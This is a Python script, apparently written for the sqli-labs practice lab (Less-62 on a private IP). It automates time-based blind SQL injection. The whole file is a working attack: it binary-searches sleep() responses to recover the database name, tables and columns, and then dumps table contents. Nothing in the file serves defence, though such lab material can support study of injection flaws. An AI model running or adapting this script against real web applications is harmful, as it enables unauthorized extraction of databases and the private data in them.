import requests
import time

#正统脚本,需要进行修改
# class time_sql_injeect:
#     self.url = ''

#     def __init__(self,url,):

def spider(url):

    # for a in range(120):
        # url = url.replace('\'','\\\'')

    len_database = lenth_databases(url)
    str_databaese = str_database(url,len_database)
    tables_list = tables(url).split(',')
    print("数据库名为：",str_databaese)
    print('表名为：',tables_list)
    column_list = columns(url,tables_list[0])
    tuoku_list = tuoku(url,tables_list[0],column_list)

    print('最后结果为:',tuoku_list)


def lenth_databases(lenth_database):
    lenth_database += 'and if(length(database())>目标,sleep(1),1)=\''
    len = dichotomy(lenth_database,1)
    print('长度为：',len)
    return len
    # print(lenth_database)

def str_database(url,len_database):

    str_database_result = ''
    for x in range(1,len_database+1):
        str_database_str = url+'and if(ascii(substr((database()),'+str(x)+',1))>目标,sleep(1),1)=\''
        # print(str_database_str)
        str_database_result += chr(dichotomy(str_database_str))
        # print(lenth_database)
    return str_database_result


def dichotomy(target,left_lenth=32,right_length=126):
    result = ''

    less_request = target
    while left_lenth < right_length:

        target_length = int((left_lenth+right_length)/2)

        lenth_database = less_request.replace('目标',str(target_length))
        # if 
        start_time = time.time()
        print(lenth_database)
        r = requests.get(lenth_database)
        r.url
        end_time= time.time()
        if end_time-start_time >= 1:
            left_lenth = target_length+1
            
        else:
            right_length = target_length
        print('小',left_lenth,'大',right_length)
        if left_lenth >= right_length:
            result = left_lenth
            break
    return result

def tables(url):
    lenth_tables_url = url+'and if((length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>目标),sleep(1),1)=\''

    length_tables = dichotomy(lenth_tables_url,1,999)



    print('表:',length_tables)
    result=''
    for x in range(1,int(length_tables)+1):
        str_tables_url = url+'and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),'+str(x)+',1))>目标,sleep(1),1)=\''
        result += chr(dichotomy(str_tables_url))
        print('结果为',result)
    return result

def columns(url,tables):

    ord_tables = ''
    for x in range(len(tables)):
        # print(tables[x])
        ord_tables += str(hex(ord(tables[x])))[2:]
    print('输出ord后的tables',ord_tables)
    lenth_columns_url = url+'and if((length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x'+ord_tables+'))>目标),sleep(1),1)=\''

    length_tables = dichotomy(lenth_columns_url,1,999)



    print('表:',length_tables)
    result=''
    for x in range(1,int(length_tables)+1):
        str_tables_url = url+'and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x'+ord_tables+'),'+str(x)+',1))>目标,sleep(1),1)=\''
        result += chr(dichotomy(str_tables_url))
        print('结果为',result)
    return result.split(',')


def tuoku(url,tables,columns):


    # for x in columns:
    #     if len(columns) == 1:
    #         pingjie = '\''+str(columns[0])+'为：\','+str(columns[0])
    #         print(pingjie)

    
    if len(columns)>1:
        tuoku_url = url+'and if(length((select group_concat('+','.join(columns)+')from '+tables+'))>目标,sleep(1),1)=\''
    else:
        tuoku_url = url+'and if(length((select group_concat('+columns[0]+')from '+tables+'))>目标,sleep(1),1)=\''
    
    print(tuoku_url)
    columns = '0x7e,'+',0x5f,'.join(columns)
    len_tuoku = dichotomy(tuoku_url,1,9999)

    result = ''
    for x in range(1,len_tuoku+1):
        tuoku_url_str = url+'and if(ascii(substr(((select group_concat('+columns+')from '+tables+')),'+str(x)+',1))>目标,sleep(1),1)=\''
        result += chr(dichotomy(tuoku_url_str))
        print('数据为'+result)

    return result

# spider()

if __name__ == "__main__":

    spider('http://172.16.83.12/Less-62/index.php?id=1\'')
    # tuoku('http://172.16.83.12/Less-62/index.php?id=1\'','XQUMEHOGFU',['secret_ID73'])